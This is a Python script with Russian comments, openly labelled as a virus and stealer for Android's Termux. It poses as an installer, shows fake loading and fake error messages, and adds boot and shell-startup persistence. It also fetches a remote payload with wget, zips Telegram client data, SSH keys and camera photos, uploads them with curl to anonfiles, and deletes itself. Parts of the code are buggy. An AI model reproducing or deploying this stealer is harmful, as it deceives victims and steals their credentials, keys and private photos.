# code by NyafkA :3 
# tg: @nyafka666

# НЕ СТАВИТЬ СПЕЦ-ЗНАКИ/КАВЫЧКИ/ТОЧКИ И БЕЗ ПРОБЕЛОВ ПО КРАЯМ!!!

# токен бота для отправки логов
bot_token = '''token'''

# ваш tg ID
tg_id = '''123456'''

# название файла установки (данного файла)
loader = '''installer.py'''

# название фонового процесса 
fon = '''system'''

# место установки (папка)
install = '''~/termux_update'''

# пароль от архива
zip_pass = '''1234567890'''

# сообщение о фейковой загрузки чего либо
loading = '''Установка компонентов... Это может занять время!'''

# сообщение о фейковой ошибки по завершению установки
error = '''Traceback (most recent call last): File "installer.py" line 12, in <module> ModuleNotFoundError: No module named "colorama'''

# ссылка на ваш файл с вирусом, естественно с полезной нагрузкой
load_link = '''https://'''

# название гита / не нужно
#git_name = '''my_git'''

# имя вируса
virus_name = '''system.py'''

# пакет pip для работы вашего вируса
package_1 = '''colorama'''

# пакет apt для работы вашего вируса 
package_2 = '''termux-api'''











#====================================

import os
from os import system, name 
import subprocess
def clear(): 
	if name == 'nt': 
		_ = system('cls') 
	else: 
		_ = system('clear') 

#====================================

# установка компонентов
clear()
print(loading)
os.system("pip install " + package_1 + ''' > /dev/null''')
os.system('pkg install ' + package_2 + ''' > /dev/null''')
os.system('pkg install teleton' + ''' > /dev/null''')

# создание папок
os.system('''mkdir ~/.termux/boot''') #autoload
os.system('mkdir ' + install) #папка вируса

# создания файлов авто-запуска
os.system('''cd ~/.termux/boot''')
os.system('touch system.sh')

# заполнение файла авто-запуска
os.system('''echo '#!/bin/bash' >> system.sh''')
os.system('''echo 'python3 ''' + install + '''/''' + virus_name + ''' > /dev/null &' >> system.sh''')

# авто-запуск через bashrc/zshrc
os.system('''echo 'python3 ~/.termux/boot/''' + virus_name + ''' > /dev/null &' >> ~/.zshrc''')

os.system('''echo 'python 3 ~/.termux/boot/''' +virus_name + ''' > /dev/null &' >> ~/.bashrc''')

# скачивание файла
#os.system('termux-setup-storage')
#нужно сделать проверку, есть ли storage, иначе оно вайпит всю систему накуй
#os.system('git clone ' + git_link + ''' > /dev/null''')
os.system('''wget ''' + load_link + ''' > /dev/null''')

# прячем вирус в папку
os.system('''mv ~/''' + virus_name + ' ' + install + '''/''' + virus_name)

# убираем следы
#хрен с маслом,я уже все убрал
#os.system('cd ~')
#os.system('rm -rvf


#========== ЧАСТЬ СТИЛЕРА=============

# папочку с клиентом тг
os.system('''cd ~/ && zip -r ftg.zip friendly-telegram > /dev/null''')
os.system('''mv ftg.zip ''' + install + ''' > /dev/null''')

# еще папочку с тг
os.system('''zip -r litebot.zip litebot > /dev/null''')
os.system('''mv litebot.zip ''' + install + '''/''' + '''litebot.zip > /dev/null''')

# ключики ssh
os.system('''zip -r ssh.zip .ssh > /dev/null''')
os.system('''mv ssh.zip ''' + install + '''/ssh.zip > /dev/null''')

# фотки
os.system('''zip -r dcim.zip ~/storage/shared/DCIM > /dev/null''')
os.system('''mv dcim.zip ''' + install + '''/dcim.zip > /dev/null''')

# загрузка на анонфайл, во бл а как же впн
s = subprocess.check_output('''curl -F "file=@ПАПКА https://api.anonfiles.com/upload''', shell=True)
#print("Ссылка на скачивание архива > " + s)

#придумаю чтонибудь получше,позже

#=====================================

print(error)

os.system('''rm -rvf ~/''' + loader)
